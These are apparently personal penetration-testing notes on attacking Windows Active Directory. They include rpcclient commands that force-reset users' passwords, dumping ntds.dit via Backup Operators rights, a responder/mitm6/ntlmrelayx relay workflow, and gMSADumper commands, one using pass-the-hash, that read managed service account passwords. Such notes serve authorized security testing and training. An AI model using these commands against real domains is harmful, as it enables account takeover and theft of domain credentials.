# active directory 

## ForceChangePassword change user password
can exploit with impacket
payloadsallthethings "Active Directory Attack.md"
```bash
rpcclient $IP -U username -W domain.local
```
within rpcclient shell
```
setuserinfo2 targetuser 23 targetnewpwd
```

## Backup Operators group
permissions to back up files. can back up C drive to dump ntds.dit

## sensitive files
ntds.dit - domain credentials

## mindset and methodology
cycle:
- compromise creds
- access services
- abuse permissions to get more permissions

## workflow for penetration test on windows network in organization
- responder
- mitm6
  - combine with responder to attack ipv6 dns requests traffic
  - combine with ntlmrelayx

## GMSA group managed service account
windows AD account with randomized, changing password to prevent kerberoasting service accounts

### read GMSA passwords python script
https://github.com/micahvandeusen/gMSADumper
```bash
python3 gMSADumper.py -u user -p password -d domain.local

# Pass the Hash, specific LDAP server:
python gMSADumper.py -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc01.domain.local

# Kerberos Authentication, specific LDAP server:
python gMSADumper.py -k -d domain.local -l dc01.domain.local
```

## change user password with rpcclient over SMB 
```bash
rpcclient -U helpdesk //$IP
rpcclient $> setuserinfo2 adminuser 23 'ASDqwe123'
```
